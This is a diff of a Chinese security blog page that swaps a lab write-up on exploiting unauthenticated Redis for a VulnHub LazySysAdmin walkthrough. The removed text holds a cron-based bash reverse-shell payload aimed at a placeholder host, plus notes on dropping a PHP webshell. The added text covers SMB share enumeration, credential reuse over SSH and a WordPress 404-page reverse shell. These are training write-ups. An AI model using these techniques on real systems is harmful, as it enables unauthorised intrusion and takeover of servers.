@@ -108,31 +108,38 @@
 
 
 
-  <meta name="description" content="安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。">
-<meta name="keywords" content="Web,redis">
+  <meta name="description" content="主要考察信息收集">
+<meta name="keywords" content="Web,CTF,Linux">
 <meta property="og:type" content="article">
-<meta property="og:title" content="redis未授权访问">
-<meta property="og:url" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/index.html">
+<meta property="og:title" content="VulnHub-LazySysAdmin">
+<meta property="og:url" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。">
+<meta property="og:description" content="主要考察信息收集">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/one.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/3.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/cat.png">
-<meta property="og:updated_time" content="2018-10-05T05:08:37.843Z">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/01.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/02.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/03.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/04.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/05.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/06.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/07.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/00.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/08.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/09.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/11.png">
+<meta property="og:updated_time" content="2018-10-05T16:51:18.004Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="redis未授权访问">
-<meta name="twitter:description" content="安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。">
-<meta name="twitter:image" content="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/one.png">
+<meta name="twitter:title" content="VulnHub-LazySysAdmin">
+<meta name="twitter:description" content="主要考察信息收集">
+<meta name="twitter:image" content="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/01.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/"/>
 
 
 
@@ -142,7 +149,7 @@
   };
 </script>
 
-  <title>redis未授权访问 | Noel's Blog</title>
+  <title>VulnHub-LazySysAdmin | Noel's Blog</title>
   
 
 
@@ -303,7 +310,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/VulnHub-LazySysAdmin/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Noel">
@@ -320,7 +327,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">redis未授权访问
+          <h1 class="post-title" itemprop="name headline">VulnHub-LazySysAdmin
               
             
           </h1>
@@ -345,7 +352,7 @@
                 
               
 
-              <time title="创建时间：2018-10-02 00:00:00" itemprop="dateCreated datePublished" datetime="2018-10-02T00:00:00+08:00">2018-10-02</time>
+              <time title="创建时间：2018-10-05 00:00:00" itemprop="dateCreated datePublished" datetime="2018-10-05T00:00:00+08:00">2018-10-05</time>
             
 
             
@@ -362,7 +369,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2018-10-05 13:08:37" itemprop="dateModified" datetime="2018-10-05T13:08:37+08:00">2018-10-05</time>
+                <time title="修改时间：2018-10-06 00:51:18" itemprop="dateModified" datetime="2018-10-06T00:51:18+08:00">2018-10-06</time>
               
             
           </span>
@@ -379,7 +386,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Challenge/" itemprop="url" rel="index"><span itemprop="name">Challenge</span></a></span>
 
                 
                 
@@ -418,32 +425,44 @@
       
 
       
-        <p>安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。<br><a id="more"></a></p>
-<h2 id="0x00-目标和方向"><a href="#0x00-目标和方向" class="headerlink" title="0x00 目标和方向"></a>0x00 目标和方向</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul>
-<li>了解Redis应用的相关服务 </li>
-<li>了解Redis基本命令的使用 </li>
-<li>了解Redis在低权限下的渗透思路 </li>
-</ul>
-<h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>远程连接Redis服务，进行漏洞利用，获取KEY。 </p>
-<h2 id="0x01-写入ssh公钥"><a href="#0x01-写入ssh公钥" class="headerlink" title="0x01 写入ssh公钥"></a>0x01 写入ssh公钥</h2><p>原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中</p>
-<p>先连接上Redis</p>
-<p>redis-cli -h 219.153.49.228 -p 40211</p>
-<p>结果在设置Redis的保存路径时就出现了错误</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/one.png" alt=""></p>
-<p>换种方法试试</p>
-<h2 id="0x02-定时任务反弹Shell"><a href="#0x02-定时任务反弹Shell" class="headerlink" title="0x02 定时任务反弹Shell"></a>0x02 定时任务反弹Shell</h2><p>上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下</p>
-<p>把Redis保存文件设置为/var/spool/cron/root</p>
-<p>写入反弹shell的命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> xxx <span class="string">"\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n"</span></span><br></pre></td></tr></table></figure>
-<p>果然Save的时候出现错误</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/2.png" alt=""></p>
-<h2 id="0x03-在Web目录下写入WebShell"><a href="#0x03-在Web目录下写入WebShell" class="headerlink" title="0x03 在Web目录下写入WebShell"></a>0x03 在Web目录下写入WebShell</h2><p>靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧</p>
-<p>先写一个PHP文件测试下</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/3.png" alt=""></p>
-<p>访问<a href="http://219.153.49.228:44328/test.php,确实写进去东西了" target="_blank" rel="noopener">http://219.153.49.228:44328/test.php,确实写进去东西了</a></p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/4.png" alt=""></p>
-<p>接下来就是写一句话，菜刀连接，拿到KEY</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/cat.png" alt=""></p>
+        <p>主要考察信息收集<br><a id="more"></a></p>
+<h2 id="0x01-前期试探"><a href="#0x01-前期试探" class="headerlink" title="0x01 前期试探"></a>0x01 前期试探</h2><p>使用nmap进行扫描,发现存在如下端口<br><img src="/2018/10/05/VulnHub-LazySysAdmin/01.png" alt=""></p>
+<p>可以做出简单的分析</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH登陆</td>
+</tr>
+<tr>
+<td>80</td>
+<td>Web应用</td>
+</tr>
+<tr>
+<td>445</td>
+<td>共享文件</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySql</td>
+</tr>
+</tbody>
+</table>
+<p>使用御剑扫描下Web应用<br><img src="/2018/10/05/VulnHub-LazySysAdmin/02.png" alt=""><br>存在PHPMyAdmin与WordPress，和robots.txt文件<br>robots.txt<br><img src="/2018/10/05/VulnHub-LazySysAdmin/03.png" alt=""><br>访问后发现没有多大用处,phpmyadmin与wordpress没有账号密码也并不好突破，<br>不过在wordpress处获得了一个可能的账号<br>togie<br><img src="/2018/10/05/VulnHub-LazySysAdmin/04.png" alt=""></p>
+<h2 id="0x02-突破点Find"><a href="#0x02-突破点Find" class="headerlink" title="0x02 突破点Find"></a>0x02 突破点Find</h2><p>因为其开放了445端口，所以用enum4linux尝试进行扫描<br><img src="/2018/10/05/VulnHub-LazySysAdmin/05.png" alt=""><br>可以看到share是OK的</p>
+<p>windows下获取共享资源<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\10.10.10.132\share$</span><br></pre></td></tr></table></figure></p>
+<p>linux下获取共享资源<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs -o username=<span class="string">''</span>,password=<span class="string">''</span> //10.10.10.132/share$ /mnt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/10/05/VulnHub-LazySysAdmin/06.png" alt=""><br>对得到文件进行查看<br>在deets.txt文件中发现一个密码<br><img src="/2018/10/05/VulnHub-LazySysAdmin/07.png" alt=""></p>
+<p>再加上刚开始得到的一个可能的账号，首先尝试了下ssh连接<br>没想到直接成功了,切换到root账户，完成<br><img src="/2018/10/05/VulnHub-LazySysAdmin/00.png" alt=""></p>
+<h2 id="0x03-Web渗透"><a href="#0x03-Web渗透" class="headerlink" title="0x03 Web渗透"></a>0x03 Web渗透</h2><h3 id="0x01-WebShell"><a href="#0x01-WebShell" class="headerlink" title="0x01 WebShell"></a>0x01 WebShell</h3><p>这样就直接拿到Shell了？多少有些无趣，看了下wordpress的config文件<br>找到了数据库的账号和密码<br><img src="/2018/10/05/VulnHub-LazySysAdmin/08.png" alt=""><br>记得刚才扫的有phpmyadmin目录，登陆成功，不过权限太低了，只好放弃<br><img src="/2018/10/05/VulnHub-LazySysAdmin/09.png" alt=""><br>尝试下登陆wordpress,没想到还是数据库的账号密码登陆上去了<br>在404界面写入反弹shell<br><img src="/2018/10/05/VulnHub-LazySysAdmin/10.png" alt=""><br>得到WebShell<br><img src="/2018/10/05/VulnHub-LazySysAdmin/11.png" alt=""></p>
+<h3 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h3><p>开坑待填……</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>总的来说是一个比较简单的challange,基本上只要掌握了enum4linux以及获取共享资源的方法就可以，<br>继续加油。</p>
 
       
     </div>
@@ -466,7 +485,9 @@
           
             <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
           
-            <a href="/tags/redis/" rel="tag"><i class="fa fa-tag"></i> redis</a>
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
           
         </div>
       
@@ -479,8 +500,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/01/sqlmap-tamper脚本编写/" rel="next" title="sqlmap --tamper脚本编写">
-                <i class="fa fa-chevron-left"></i> sqlmap --tamper脚本编写
+              <a href="/2018/10/05/PHPSHE1-5漏洞分析/" rel="next" title="PHPSHE1.5漏洞分析">
+                <i class="fa fa-chevron-left"></i> PHPSHE1.5漏洞分析
               </a>
             
           </div>
@@ -488,10 +509,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/02/Vulnhub-FristiLeaks/" rel="prev" title="Vulnhub FristiLeaks">
-                Vulnhub FristiLeaks <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -661,7 +678,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-目标和方向"><span class="nav-number">1.</span> <span class="nav-text">0x00 目标和方向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#目标"><span class="nav-number">1.1.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方向"><span class="nav-number">1.2.</span> <span class="nav-text">方向</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-写入ssh公钥"><span class="nav-number">2.</span> <span class="nav-text">0x01 写入ssh公钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-定时任务反弹Shell"><span class="nav-number">3.</span> <span class="nav-text">0x02 定时任务反弹Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-在Web目录下写入WebShell"><span class="nav-number">4.</span> <span class="nav-text">0x03 在Web目录下写入WebShell</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前期试探"><span class="nav-number">1.</span> <span class="nav-text">0x01 前期试探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-突破点Find"><span class="nav-number">2.</span> <span class="nav-text">0x02 突破点Find</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Web渗透"><span class="nav-number">3.</span> <span class="nav-text">0x03 Web渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-WebShell"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-提权"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
             
 
           </div>
